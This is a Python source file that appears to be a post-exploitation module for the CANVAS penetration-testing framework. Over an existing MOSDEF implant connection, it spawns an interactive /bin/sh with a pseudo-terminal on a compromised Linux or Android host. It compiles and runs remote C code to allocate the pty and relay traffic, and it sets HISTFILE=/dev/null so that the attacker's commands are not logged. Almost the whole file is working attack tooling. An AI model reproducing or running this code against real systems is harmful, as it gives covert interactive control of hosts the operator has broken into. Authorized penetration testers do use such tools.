#!/usr/bin/env python

# yes, this is a re-factoring of existing shellserver code
# this should port cleaner to Solaris/AIX/etc. so we will
# add them as the module expands
#
# vim: sw=4 ts=4 expandtab

import ctypes
import telnetlib
import sys
import socket
import select
import time
try:
    import termios
except:
    pass
import copy
import struct
from threading import Thread

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from MOSDEF import mosdef
from ExploitTypes.localcommand import LocalCommand

import logging


NAME                            = 'PtyShell'
DESCRIPTION                     = 'Grabs a shell with a pty'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Linux'
DOCUMENTATION["Date public"]    = ''
DOCUMENTATION["CVE Name"]       = ''
DOCUMENTATION["CVE Url"]        = ''
DOCUMENTATION["References"]     = ['']
VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Commands'
PROPERTY['SITE']                = 'Local'
PROPERTY['ARCH']                = [ ['Linux', 'i386', 'ARM9'] ]
DOCUMENTATION["Notes"]          = """
This module is very useful on Linux Nodes where you need to use VIM or another tty-based tool for a brief moment

NOTE: This module currently only works with CANVAS running on Linux
"""

ID_TERMINAL = 1

# XXX: this will only work on linux !!! we are working on a pure-python solution
try:
    import fcntl
except Exception, err:
    logging.warning("pty_shell: %s" % err)
    logging.warning("Note: pty_shell only works with CANVAS running on Linux")
    raise ImportError

try:
    PTY_PROXY_PORT = 65521
    import gtk, gobject, thread

    try:
        import vte
    except Exception, err:
        logging.warning("pty_shell: %s" % err)
        raise ImportError

    class RemotePtyProxy(Thread):
        def __init__(self, client_fd, port=PTY_PROXY_PORT):
            Thread.__init__(self)
            self.port = port
            self.client_fd = client_fd

        def run(self):
            self.client_fd.connect(('127.0.0.1', self.port))

    class SpliceLoop(Thread):
        def __init__(self, fd1, fd2, terminal):
            Thread.__init__(self)
            self.terminal = terminal
            self.fd1 = fd1 # this is the pty end
            self.fd2 = fd2 # this is the mosdef end
            self.flags1 = fcntl.fcntl(self.fd1, fcntl.F_GETFL)
            self.flags2 = fcntl.fcntl(self.fd2, fcntl.F_SETFL)
            fcntl.fcntl(self.fd1, fcntl.F_SETFL, self.flags1 | os.O_NONBLOCK)
            fcntl.fcntl(self.fd2, fcntl.F_SETFL, self.flags2 | os.O_NONBLOCK)
            self.saw_veof = False

        def run(self):
            print '*** starting splice loop ***'

            MOSDEF_BUF_SIZE = 4096 + 4 # max buf size ... matching C-end for max buffer lollariciousness
            fd1 = self.fd1
            fd2 = self.fd2
            fd1_buf = ''
            fd2_buf = ''
            fd1_saw_eof = 0
            fd2_saw_eof = 0
            rfds = []
            wfds = []
            rpacket = 0
            wpacket = 0
            fd1_size = 0
            fd2_size = 0

            while fd1_saw_eof != 3 or fd2_saw_eof != 2 or fd1_size or fd2_size:

                # pty master read events
                if not fd1_saw_eof and not fd2_saw_eof and fd1_size != MOSDEF_BUF_SIZE:
                    if fd1 not in rfds:
                        rfds.append(fd1)
                elif fd1 in rfds:
                    rfds.remove(fd1)

                # mosdef socket read events
                if not fd2_saw_eof and fd2_size != MOSDEF_BUF_SIZE - 4:
                    if fd2 not in rfds:
                        rfds.append(fd2)
                elif fd2 in rfds:
                    rfds.remove(fd2)

                # pty master write events
                if not fd1_saw_eof and (rpacket and fd2_size or fd2_saw_eof == 1):
                    if fd1 not in wfds:
                        wfds.append(fd1)
                elif fd1 in wfds:
                    wfds.remove(fd1)

                # mosdef socket write events
                if fd1_size or (fd1_saw_eof >= 1 and fd1_saw_eof < 3):
                    if fd2 not in wfds:
                        wfds.append(fd2)
                elif fd2 in wfds:
                    wfds.remove(fd2)

                # if we're only left draining, skip the select
                if fd1_saw_eof != 3 or fd2_saw_eof != 2:
                    try:
                        rfds, wfds, xfd = select.select(rfds, wfds, [])
                    except:
                        break

                # WRITE EVENTS TO PTY MASTER OR DRAIN IF IT DIED
                if fd1_saw_eof or fd1 in wfds:
                    towrite = fd2_size
                    if towrite > rpacket:
                        towrite = rpacket
                    if towrite:
                        ret = 0
                        if not fd1_saw_eof:
                            try:
                                ret = os.write(fd1, fd2_buf[:towrite])
                            except OSError, e:
                                if e[0] != 11: # EAGAIN
                                    break
                            except:
                                break
                        else:
                            ret = towrite

                        if ret > 0:
                            fd2_buf = fd2_buf[ret:]
                            rpacket -= ret
                            fd2_size -= ret

                    # we had a VEOF on the socket
                    if not fd2_size and fd2_saw_eof == 1:
                        fd2_saw_eof = 2
                        try:
                            os.close(fd1)
                        except:
                            pass
                        fd1_saw_eof = 1

                # WRITE EVENTS TO MOSDEF SOCKET
                if fd2 in wfds:
                    if not wpacket:
                        wpacket = fd1_size
                        fd1_buf = struct.pack('!L', len(fd1_buf)) + fd1_buf
                        fd1_size += 4
                        wpacket += 4

                    ret = 0
                    try:
                        ret = os.write(fd2, fd1_buf[:wpacket])
                    except OSError, e:
                        if e[0] != 11:
                            break
                    except:
                        break

                    if ret > 0:
                        fd1_size -= ret
                        wpacket -= ret
                        fd1_buf = fd1_buf[ret:]

                    if not fd1_size:

                        if fd1_saw_eof == 1:
                            fd1_saw_eof = 2
                            fd1_buf = struct.pack('!L', 0)
                            wpacket = 4
                            fd1_size = 4

                        elif fd1_saw_eof == 2:
                            fd1_saw_eof = 3

                # read events from pty
                if fd1 in rfds:
                    data = ''
                    try:
                        data = os.read(fd1, MOSDEF_BUF_SIZE - 4 - fd1_size)
                    except:
                        pass
                    if len(data):
                        fd1_size += len(data)
                        fd1_buf += data
                    else:
                        fd1_saw_eof = 1
                        try:
                            os.close(fd1)
                        except:
                            pass

                # read events from mosdef
                if fd2 in rfds:
                    data = ''
                    try:
                        data = os.read(fd2, MOSDEF_BUF_SIZE - 4 - fd2_size)
                    except OSError, e:
                        if e[0] != 11:
                            break
                    except:
                        break
                    if len(data):
                        fd2_size += len(data)
                        fd2_buf += data
                        while fd2_size >= rpacket + 4:
                            new = 0
                            try:
                                new = struct.unpack('!L', fd2_buf[rpacket:rpacket+4])[0]
                            except:
                                print repr(fd2_buf)
                            fd2_buf = fd2_buf[:rpacket] + fd2_buf[rpacket+4:]
                            fd2_size -= 4
                            if not new:
                                print '*** (V)EOF ***'
                                fd2_saw_eof = 1
                                self.saw_veof = True
                            else:
                                rpacket += new
                        if self.saw_veof == True:
                            break
                    else:
                        fd2_saw_eof = 1
            try:
                os.close(fd1)
            except:
                pass

            print '*** exiting splice loop (saw_veof: %s) ***' % str(self.saw_veof)
            fcntl.fcntl(fd2, fcntl.F_SETFL, self.flags2)
            self.terminal.destroy() # emit destroy signal for terminal ...

            return


    VTE_ERASE_AUTO = 0
    VTE_ERASE_ASCII_BACKSPACE = 1
    VTE_ERASE_ASCII_DELETE = 2
    VTE_ERASE_DELETE_SEQUENCE = 3

    class GuiTerminal(Thread):
        def __init__(self, mfd, gui, title='default'):
            Thread.__init__(self)
            self.gui = gui
            self.mfd = mfd
            # set up the localhost communications socket XXX: needs error checking
            proxy_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            bound_proxy = False
            proxy_port = PTY_PROXY_PORT
            while bound_proxy == False:
                try:
                    proxy_server.bind(('127.0.0.1', proxy_port))
                    bound_proxy = True
                except:
                    proxy_port += 1
            print '*** localhost pty proxy port: %d ***' % proxy_port

            proxy_server.listen(1)
            self.client_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            pty_proxy_client = RemotePtyProxy(self.client_fd, port=proxy_port)
            pty_proxy_client.start()
            self.remote_pty = proxy_server.accept()[0]
            fcntl.fcntl(self.remote_pty.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
            proxy_server.close()
            pty_proxy_client.join()

            self.term = vte.Terminal()
            self.win = gtk.Window()
            self.win.set_title(title)

            self.splice_loop = SpliceLoop(self.client_fd.fileno(), self.mfd.fileno(), self.win)

        def run(self):
            """ init the terminal settings, start the splice loop, and handle gui bits """

            self.term.set_pty(self.remote_pty.fileno())
            self.term.set_font_from_string('Monospace')
            self.term.set_cursor_blinks(True)
            self.term.set_scrollback_lines(1000)
            self.term.set_audible_bell(True)
            self.term.set_visible_bell(False)
            self.term.set_backspace_binding(VTE_ERASE_ASCII_BACKSPACE)

            self.splice_loop.start()

            self.win.connect('destroy', self.destroy)
            self.win.add(self.term)

            x_pad, y_pad = self.term.get_padding()
            c_width = self.term.get_char_width()
            c_height = self.term.get_char_height()
            self.win.set_geometry_hints(self.term,
                                        base_width=x_pad,
                                        base_height=y_pad,
                                        width_inc=c_width,
                                        height_inc=c_height,
                                        min_width=x_pad + c_width * 4,
                                        min_height=y_pad + c_height * 2)

            self.win.set_modal(True)

            # parent our new window with the existing gui if needed
            if hasattr(self.gui, 'window'):
                self.win.set_modal(True)
                self.gui.window.set_sensitive(False)
                self.win.set_transient_for(self.gui.window)
                self.win.connect('delete-event', self.delete_event)

            self.win.show_all()

            if hasattr(self.gui, 'window'):
                print '*** parented terminal window with main gui ***'
            else:
                gtk.gdk.threads_init()
                gtk.gdk.threads_enter()
                gtk.main()
                gtk.gdk.threads_leave()

            return self.splice_loop.join()

        def delete_event(self, *args):
            return False # trigger a destroy on delete event ...

        def destroy(self, event = None):
            wrote_veof = False
            while self.splice_loop.saw_veof == False:
                if wrote_veof == False:
                    os.write(self.mfd.fileno(), struct.pack('!L', 0))
                    wrote_veof = True
            self.mfd.setblocking(1)
            if hasattr(self.gui, 'window'):
                print '*** parented by main gui, no main_quit needed ***'
                self.gui.window.set_sensitive(True)
            else:
                gtk.main_quit()
            return

except:
    import traceback
    traceback.print_exc(file=sys.stderr)
    print '*** No vte installed falling back to local terminal ***'
    pass

class CustomTelnet(telnetlib.Telnet):

    def __del__(self):
        """ override the destructor so our mosdefd doesn't get dropped """
        print '*** Keeping MOSDEF fd open ***'

    def interact(self):
        """Interaction function, emulates a very dumb telnet client."""
        if sys.platform == "win32":
            self.mt_interact()
            return
        line = ''
        saw_veof = False
        while 1:
            rfd, wfd, xfd = select.select([self, sys.stdin], [], [])
            if self in rfd:
                text = ''
                try:
                    text = os.read(self.sock.fileno(), 1)
                    if not text:
                        raise EOFError
                    while len(text) < 4:
                        text += os.read(self.sock.fileno(), 1)
                    m_type = struct.unpack('!L', text[0:4])[0]
                    if m_type == 0:
                        print '*** (V)EOF ***'
                        saw_veof = True
                        text = ''
                    else:
                        text = text[4:]
                        while m_type != len(text):
                            text += os.read(self.sock.fileno(), 1)
                except EOFError:
                    print '*** Connection closed by remote host ***'
                    break
                if text:
                    sys.stdout.write(text)
                    sys.stdout.flush()

            if saw_veof == True:
                break

            if sys.stdin in rfd:
                c = sys.stdin.read(1)
                line += c
                if not c:
                    print '*** Error on stdin ***'
                    self.write(struct.pack('!L', 0))
                    break
                if line == '~.\n':
                    print '*** Terminate Sequence ***'
                    self.write(struct.pack('!L', 0))
                    break
                self.write(struct.pack('!L', 1) + c)
                if c == '\n':
                    line = ''

    def mt_interact(self):
        """Multithreaded version of interact()."""
        import thread
        thread.start_new_thread(self.listener, ())
        while 1:
            line = sys.stdin.readline()
            if line == 'exit\n':
                self.write(line)
                print '*** Returning to MOSDEF ***'
                break
            if not line:
                break
            self.write(line)

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name = NAME
        self._PATH_DEVPTS = '/dev/pts/'
        self.shell = '/bin/sh'

    def __getpt(self):
        O_RDWR = self.node.shell.libc.getdefine('O_RDWR')
        O_NOCTTY = self.node.shell.libc.getdefine('O_NOCTTY')
        return ctypes.c_int(self.node.shell.open('/dev/ptmx', O_RDWR|O_NOCTTY)).value

    def __ptsname_r(self, fd):
        varz = { 'fd' : fd }
        code = """
        #include <sys/ioctl.h>

        #import "local","sendint" as "sendint"

        #import "int","fd" as "fd"

        void
        main(void)
        {
            unsigned int ptyno;

            if (ioctl(fd, TIOCGPTN, &ptyno) < 0)
            {
                sendint(-1);
            }
            else
            {
                sendint(ptyno);
            }
        }
        """
        ptyno = ctypes.c_int(self.node.shell.runCode(code, varz)).value
        if ptyno < 0:
            return ''
        return self._PATH_DEVPTS + '%u' % ptyno

    def __ptsname(self, fd):
        return self.__ptsname_r(fd)

    def __grantpt(self, fd):

        pts = self.__ptsname_r(fd)
        if not len(pts):
            return -1

        uid = ctypes.c_int(self.node.shell.ids()[0]).value
        if uid < 0:
            return -1

        # chown and chmod
        varz = { 'pts' : pts, 'uid' : uid }
        code = """
        #include <sys/stat.h>
        #include <unistd.h>

        #import "local","sendint" as "sendint"
        #import "string","pts" as "pts"
        #import "int","uid" as "uid"

        void
        main(void)
        {
            if (chown(pts, uid, -1) < 0)
            {
                sendint(-1);
            }
            else
            {
                if (chmod(pts, S_IRUSR|S_IWUSR|S_IWGRP) < 0)
                {
                    sendint(-1);
                }
            }

            sendint(0);
        }
        """
        if ctypes.c_int(self.node.shell.runCode(code, varz)).value == -1:
            return -1
        return 0

    def __unlockpt(self, fd):
        varz = { 'fd' : fd }
        code = """
        #include <sys/ioctl.h>

        #import "local","sendint" as "sendint"
        #import "int","fd" as "fd"

        void
        main(void)
        {
            int lock;
            int ret;

            lock = 0;
            ret = ioctl(fd, TIOCSPTLCK, &lock);

            sendint(ret);
        }
        """
        return ctypes.c_int(self.node.shell.runCode(code, varz)).value

    def sh_tty_child(self, pts_fd, tty_fd):
        varz = {
            'pts_fd' : pts_fd,
            'tty_fd' : tty_fd,
            'shell'  : self.shell,
        }

        code = """
        #include <unistd.h>
        #include <sys/ioctl.h>

        #import "local",  "sendint" as "sendint"
        #import "string", "shell" as "shell"
        #import "int", "pts_fd" as "pts_fd"
        #import "int", "tty_fd" as "tty_fd"

        void
        main(void)
        {
           int pid;

           pid = fork();
           if (pid == 0)
           {
                char *argv[2];
                char *envp[5];

                argv[0] = shell;
                argv[1] = NULL;

                envp[0] = "TERM=xterm";
                envp[1] = "HISTFILE=/dev/null";
                envp[2] = "PATH=/bin:/sbin:/usr/bin:/usr/sbin";
                envp[3] = "HOME=/dev/shm";
                envp[4] = NULL;

                close(pts_fd);

                setsid();
                ioctl(tty_fd, TIOCSCTTY);
                dup2(tty_fd, 0);
                dup2(tty_fd, 1);
                dup2(tty_fd, 2);
                close(tty_fd);

                execve(argv[0], argv, envp);
            }
            else
            {
                if (pid != -1)
                {
                    close(tty_fd);
                }

                sendint(pid);
            }
        }
        """
        return ctypes.c_int(self.node.shell.runCode(code, varz)).value

    def waitpid(self, pid):
        varz = { 'pid' : pid }
        code = """
        #import "local","wait4" as "wait4"
        #import "local","sendint" as "sendint"
        #import "int","pid" as "pid"

        void
        main(void)
        {
            int status;
            int ret;

            ret = wait4(pid, &status, 0, 0);

            sendint(ret);
        }
        """
        return ctypes.c_int(self.node.shell.runCode(code, varz)).value

    def splice_loop(self, fd1, fd2):

        if (fd1 > fd2):
            maxfd = fd1
        else:
            maxfd = fd2

        varz = { 'fd1' : fd1,
                 'fd2' : fd2,
                 'maxfd' : maxfd,
                 'M_EAGAIN' : -11 }

        code = """
        #include <unistd.h>
        #include <stdlib.h>
        #include <string.h>
        #include <sys/fcntl.h>

        #import "local","select" as "select"
        #import "local","wait4" as "wait4"
        #import "local","sendint" as "sendint"
        #import "local","puts" as "puts"

        #import "int","fd1" as "fd1"
        #import "int","fd2" as "fd2"
        #import "int","maxfd" as "maxfd"
        #import "int","M_EAGAIN" as "M_EAGAIN"

        unsigned long int
        FDMASK(int fd)
        {
            unsigned long int mask;
            int shift;

            shift = fd % __NFDBITS;
            mask = 1 << shift;

            return mask;
        }

        unsigned long int
        FDELT(int fd)
        {
            unsigned long int delta;

            delta = fd / __NFDBITS;

            return delta;
        }

        void
        FD_SET(int fd, unsigned long int *fds)
        {
            unsigned long int delta;
            unsigned long int mask;

            delta = FDELT(fd);
            mask = FDMASK(fd);

            fds[delta] = fds[delta] | mask;

            return;
        }

        void
        FD_CLR(int fd, unsigned long int *fds)
        {
            unsigned long int delta;
            unsigned long int mask;

            delta = FDELT(fd);
            mask = FDMASK(fd);
            mask = 0 - mask;
            mask = mask - 1;

            fds[delta] = fds[delta] & mask;

            return;
        }

        int
        FD_ISSET(int fd, unsigned long int *fds)
        {
            unsigned long int delta;
            unsigned long int mask;
            int isset;

            delta = FDELT(fd);
            mask = FDMASK(fd);

            if (fds[delta] & mask)
            {
                return 1;
            }
            else
            {
                return 0;
            }
        }

        int
        test_while_condition(   int fd1_size,
                                int fd2_size,
                                int fd1_saw_eof,
                                int fd2_saw_eof )
        {
            int ret;

            ret = 1;

            if (fd1_size != 0)
            {
                ret = 0;
            }

            if (fd2_size != 0)
            {
                ret = 0;
            }

            if (fd1_saw_eof != 3)
            {
                ret = 0;
            }

            if (fd2_saw_eof != 2)
            {
                ret = 0;
            }

            return ret;
        }

        unsigned int
        MIN(unsigned int a, unsigned int b)
        {
            if (a < b)
            {
                return a;
            }
            return b;
        }

        unsigned int
        MAX(unsigned int a, unsigned int b)
        {
            if (a > b)
            {
                return a;
            }
            return b;
        }

        unsigned int
        GET_32BIT_MSB(char *cp)
        {
            int value;
            int orb;

            value = 0;

            orb = cp[0] << 24;  orb = orb & 0xFF000000; value = value | orb;
            orb = cp[1] << 16;  orb = orb & 0x00FF0000; value = value | orb;
            orb = cp[2] << 8;   orb = orb & 0x0000FF00; value = value | orb;
            orb = cp[3];        orb = orb & 0x000000FF; value = value | orb;

            return value;
        }

        void
        PUT_32BIT_MSB(char *cp, unsigned int value)
        {
            char orb;

            orb = value >> 24;  cp[0] = orb;
            orb = value >> 16;  cp[1] = orb;
            orb = value >> 8;   cp[2] = orb;
            orb = value;        cp[3] = orb;
        }

        void
        main(void)
        {
            int child_pid;
            int status;
            int sync_pipe[2];

            pipe(&sync_pipe);
            status = 0;

            child_pid = fork();
            if (child_pid != 0)
            {
                sendint(child_pid);

                close(sync_pipe[0]);
                write(sync_pipe[1], "X", 1);

                if (child_pid != -1)
                {
                    wait4(child_pid, &status, 0, 0);
                }
            }
            else
            {
                int fd1_saw_eof;
                int fd2_saw_eof;
                unsigned int fd1_size;
                unsigned int fd2_size;
                unsigned long int *prfds;
                unsigned long int *pwfds;
                unsigned int rpacket;
                unsigned int wpacket;
                char fd1_buf[FD1SZ];
                char fd2_buf[BUFSZ];
                int retval;
                int ret;
                int aligned_maxfd;
                int do_select;
                int do_pty_write;
                int do_clr;
                int flags1;
                int flags2;
                int new;
                unsigned int towrite;
                int veof;

                close(sync_pipe[1]);
                read(sync_pipe[0], &ret, 1);

                fd1_saw_eof = 0;
                fd2_saw_eof = 0;
                fd1_size = 0;
                fd2_size = 0;
                retval = -1;
                aligned_maxfd = maxfd + 7;
                aligned_maxfd = aligned_maxfd / 8;
                do_select = 0;
                rpacket = 0;
                wpacket = 0;
                do_pty_write = 0;
                do_clr = 0;
                towrite = 0;
                veof = 0;

                flags1 = fcntl(fd1, F_GETFL);
                flags2 = fcntl(fd2, F_GETFL);

                fcntl(fd1, F_SETFL, flags1 | O_NONBLOCK);
                fcntl(fd2, F_SETFL, flags2 | O_NONBLOCK);

                prfds = malloc(aligned_maxfd * 4);
                pwfds = malloc(aligned_maxfd * 4);

                memset(prfds, 0, aligned_maxfd);
                memset(pwfds, 0, aligned_maxfd);

                ret = test_while_condition(fd1_size, fd2_size, fd1_saw_eof, fd2_saw_eof);
                while(ret == 0)
                {
                    do_clr = 1;
                    if (fd1_saw_eof == 0)
                    {
                        if (fd2_saw_eof == 0)
                        {
                            if (fd1_size != BUFSZ)
                            {
                                FD_SET(fd1, prfds);
                                do_clr = 0;
                            }
                        }
                    }
                    if (do_clr == 1)
                    {
                        FD_CLR(fd1, prfds);
                    }

                    do_clr = 1;
                    if (fd2_saw_eof == 0)
                    {
                        if (fd2_size != BUFSZ)
                        {
                            FD_SET(fd2, prfds);
                            do_clr = 0;
                        }
                    }
                    if (do_clr == 1)
                    {
                        FD_CLR(fd2, prfds);
                    }

                    do_clr = 1;
                    if (fd1_saw_eof == 0)
                    {
                        if (rpacket != 0)
                        {
                            if (fd2_size != 0)
                            {
                                FD_SET(fd1, pwfds);
                                do_clr = 0;
                            }
                        }
                        if (fd2_saw_eof == 1)
                        {
                            FD_SET(fd1, pwfds);
                            do_clr = 0;
                        }
                    }
                    if (do_clr == 1)
                    {
                        FD_CLR(fd1, pwfds);
                    }

                    do_clr = 1;
                    if (fd1_size != 0)
                    {
                        FD_SET(fd2, pwfds);
                        do_clr = 0;
                    }
                    if (fd1_saw_eof > 0)
                    {
                        if (fd1_saw_eof < 3)
                        {
                            FD_SET(fd2, pwfds);
                            do_clr = 0;
                        }
                    }
                    if (do_clr == 1)
                    {
                        FD_CLR(fd2, pwfds);
                    }

                    if (fd1_saw_eof != 3)
                    {
                        do_select = 1;
                    }
                    if (fd2_saw_eof != 2)
                    {
                        do_select = 1;
                    }
                    if (do_select == 1)
                    {
                        do_select = 0;

                        ret = select(maxfd + 1, prfds, pwfds, NULL, NULL);
                        if (ret < 0)
                        {
                            free(prfds);
                            free(pwfds);
                            close(fd1);
                            write(fd2, &veof, 4);
                            fcntl(fd2, F_SETFL, flags2);
                            _exit(0);
                        }
                    }

                    ret = FD_ISSET(fd1, pwfds);
                    if (ret != 0)
                    {
                        do_pty_write = 1;
                    }
                    if (fd1_saw_eof != 0)
                    {
                        do_pty_write = 1;
                    }
                    if (do_pty_write == 1)
                    {
                        do_pty_write = 0;
                        towrite = MIN(fd2_size, rpacket);

                        if (towrite != 0)
                        {
                            if (fd1_saw_eof == 0)
                            {
                                ret = write(fd1, fd2_buf, towrite);
                            }
                            else
                            {
                                ret = towrite;
                            }
                            if (ret < 0)
                            {
                                if (ret != M_EAGAIN) // MOSDEF EAGAIN
                                {
                                    free(prfds);
                                    free(pwfds);
                                    close(fd1);
                                    write(fd2, &veof, 4);
                                    fcntl(fd2, F_SETFL, flags2);
                                    _exit(0);
                                }
                            }
                            if (ret > 0)
                            {
                                fd2_size = fd2_size - ret;
                                rpacket = rpacket - ret;
                                memmove(fd2_buf, fd2_buf + ret, fd2_size);
                            }
                        }
                        if (fd2_size == 0)
                        {
                            if (fd2_saw_eof == 1)
                            {
                                fd2_saw_eof = 2;
                                close(fd1);
                                fd1_saw_eof = 1;
                            }
                        }
                    }

                    ret = FD_ISSET(fd2, pwfds);
                    if (ret != 0)
                    {
                        if (wpacket == 0)
                        {
                            wpacket = fd1_size;
                            memmove(fd1_buf + 4, fd1_buf, fd1_size);
                            PUT_32BIT_MSB(fd1_buf, wpacket);
                            fd1_size = fd1_size + 4;
                            wpacket = wpacket + 4;
                        }

                        ret = write(fd2, fd1_buf, wpacket);
                        if (ret < 0)
                        {
                            if (ret != M_EAGAIN)
                            {
                                free(prfds);
                                free(pwfds);
                                close(fd1);
                                fcntl(fd2, F_SETFL, flags2);
                                _exit(0);
                            }
                        }
                        if (ret > 0)
                        {
                            fd1_size = fd1_size - ret;
                            wpacket = wpacket - ret;
                            memmove(fd1_buf, fd1_buf + ret, fd1_size);
                        }
                        if (fd1_size == 0)
                        {
                            if (fd1_saw_eof == 2)
                            {
                                fd1_saw_eof = 3;
                            }
                            else
                            {
                                if (fd1_saw_eof == 1)
                                {
                                    fd1_saw_eof = 2;
                                    memcpy(fd1_buf, &veof, 4);
                                    wpacket = 4;
                                    fd1_size = 4;
                                }
                            }
                        }
                    }

                    ret = FD_ISSET(fd1, prfds);
                    if (ret != 0)
                    {
                        ret = read(fd1, fd1_buf + fd1_size, BUFSZ - fd1_size);

                        if (ret < 0)
                        {
                            if (ret != M_EAGAIN)
                            {
                                free(prfds);
                                free(pwfds);
                                close(fd1);
                                write(fd2, &veof, 4);
                                fcntl(fd2, F_SETFL, flags2);
                                _exit(0);
                            }
                        }
                        if (ret > 0)
                        {
                            fd1_size = fd1_size + ret;
                        }
                        if (ret == 0)
                        {
                            fd1_saw_eof = 1;
                            close(fd1);
                        }
                    }

                    ret = FD_ISSET(fd2, prfds);
                    if (ret != 0)
                    {
                        ret = read(fd2, fd2_buf + fd2_size, BUFSZ - fd2_size);
                        if (ret < 0)
                        {
                            if (ret != M_EAGAIN)
                            {
                                free(prfds);
                                free(pwfds);
                                close(fd1);
                                fcntl(fd2, F_SETFL, flags2);
                                _exit(0);
                            }
                        }
                        if (ret > 0)
                        {
                            fd2_size = fd2_size + ret;
                            while (fd2_size > rpacket + 3) // kludge to prevent >= error
                            {
                                new = GET_32BIT_MSB(fd2_buf + rpacket);
                                memmove(fd2_buf + rpacket, fd2_buf + rpacket + 4, fd2_size - rpacket - 4);
                                fd2_size = fd2_size - 4;

                                if (new == 0)
                                {
                                    fd2_saw_eof = 1;
                                }
                                else
                                {
                                    rpacket = rpacket + new;
                                }
                            }
                        }
                        if (ret == 0)
                        {
                            fd2_saw_eof = 1;
                        }
                    }

                    ret = test_while_condition(fd1_size, fd2_size, fd1_saw_eof, fd2_saw_eof);
                }

                free(prfds);
                free(pwfds);
                close(fd1);
                fcntl(fd2, F_SETFL, flags2);
                _exit(0);
            }
        }
        """.replace('BUFSZ', '4096').replace('FD1SZ', str(4096 + 4)).replace('__NFDBITS', str(8 * 4))

        ids = self.node.shell.ids()
        pid = ctypes.c_int(self.node.shell.runCode(code, varz)).value

        if pid < 0:
            self.log('splice_loop() error')
            return -1

        self.log('[+] forked splice loop child (PID: %d)' % pid)

        # interact with our shell ...
        try:
            self.log('[+] trying GNOME virtual terminal emulator')
            title = ''
            for ip in self.node.interfaces.all_ips():
                if ip not in ['127.0.0.1']: # skip localhost
                    if not len(title):
                        title += ip
                    else:
                        title += ','+ip
            title += ' uid=%d,euid=%d,gid=%d,egid=%d' % (ids[0], ids[1], ids[2], ids[3])
            gui_shell = GuiTerminal(self.node.shell.connection,
                                    self.engine.gui,
                                    title=title)
            gui_shell.start()
            gui_shell.join()
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            self.log('[-] no gnome-vte installed, falling back to commandline handler')
            try:
                tn = None

                try:
                    fd = sys.stdin.fileno()
                    new = termios.tcgetattr(fd)
                    old = copy.deepcopy(new)

                    new[3] = new[3] & ~termios.ECHO # -echo
                    new[3] = new[3] & ~termios.ICANON # -icanon
                    new[3] = new[3] & ~termios.VINTR # -vintr ... pass on Ctrl-C
                    new[3] = new[3] & ~termios.VQUIT # -vquit
                    termios.tcsetattr(fd, termios.TCSANOW, new)
                except:
                    pass

                tn = CustomTelnet()
                tn.sock = self.node.shell.connection
                tn.interact()

                try:
                    termios.tcsetattr(fd, termios.TCSANOW, old)
                except:
                    pass
            except:
                try:
                    if tn:
                        tn.write('exit\n')
                except:
                    pass

        return 0 # this returns kicks in the CustomTelnet destructor ...

    def get_args(self):
        self.getarg('shell')

    def run(self):
        self.setInfo('[+] %s (Active: exit shell to finish)' % NAME)
        self.node = self.argsDict['passednodes'][0]

        if 'linux' not in self.node.capabilities:
            self.log('[-] node %s not a Linux node ...' % self.node.getname())
            return False

        # Autodetect android but let user override path with 'shell' argument
        if 'android' in self.node.capabilities:
            self.shell = '/system/bin/sh'

        self.get_args()

        # run on selected node ...
        pts_fd = self.__getpt()
        if pts_fd < 0:
            self.log('getpt() error')
            return False

        self.log('[+] pts_fd: %d' % pts_fd)

        if self.__grantpt(pts_fd) < 0:
            self.log('[x] grantpt() error')
            return False

        if self.__unlockpt(pts_fd) < 0:
            self.log('[x] unlockpt() error')
            return False

        pts = self.__ptsname(pts_fd)
        if not len(pts):
            self.log('[x] ptsname() error')
            return False

        self.log('[+] pts: %s' % pts)

        tty_fd = ctypes.c_int(self.node.shell.open(pts, self.node.shell.libc.getdefine('O_RDWR'))).value
        if tty_fd < 0:
            self.log('[x] open() error')
            return False

        self.log('[+] tty_fd: %d' % tty_fd)

        child_pid = self.sh_tty_child(pts_fd, tty_fd)
        if child_pid == -1:
            self.log('[x] sh_tty_child() error')
            return False

        self.log('[+] spawned a child shell with a tty (PID: %d)' % child_pid)

        # interact with the shell ...
        if self.splice_loop(pts_fd, self.node.shell.fd) == -1:
            self.log('splice_loop() error')
            return False

        # waitpid for our child pid so we don't have defunct children
        if self.waitpid(child_pid) == -1:
            self.log('waitpid() error') # not fatal

        self.setInfo('[+] %s (Exited: returned to MOSDEF)' % NAME)
        return True


if __name__== "__main__":
    print "This module is meant to be run only within CANVAS"
